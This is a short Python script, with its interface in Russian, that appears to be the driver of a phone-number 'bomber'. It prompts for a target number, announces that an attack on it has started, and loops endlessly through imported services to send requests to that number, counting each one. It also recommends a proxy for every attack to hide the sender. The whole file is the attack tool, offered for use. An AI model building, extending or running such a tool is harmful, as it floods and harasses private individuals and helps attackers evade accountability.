import sys, os
from StructService import Distribution_Service
from config import attack


attack_number_phone=Distribution_Service()
os.system('clear');
print('автор мода: Vedmak')
print(f" ")
print(f"  подсказка: при каждой атаке советуется использовать прокси ")
print(f" ")
target=input('ВВЕДИТЕ НОМЕР: ')

try:
    attack_number_phone.phone(target)
    print(f"АТАКА НА НОМЕР: {target} НАЧАЛАСЬ")
    print(f" СТОП - ctrl + z")
    print(f" ")
except Exception as error:
    print(f'ВЫ ВВЕЛИ НЕПРАВИЛЬНЫЙ НОМЕР ПРИМЕР:  +77777777')
    print(f'ПЕРЕЗАПУСТИТЕ УТИЛИТУ')
    sys.exit()

while True:
    
    try:
        attack_number_phone.random_service()
        attack += 1
        print(f"отправлено запросов: {attack} на номер: {target}")
        print(f"  ")
        clear
    except Exception:
        pass

#
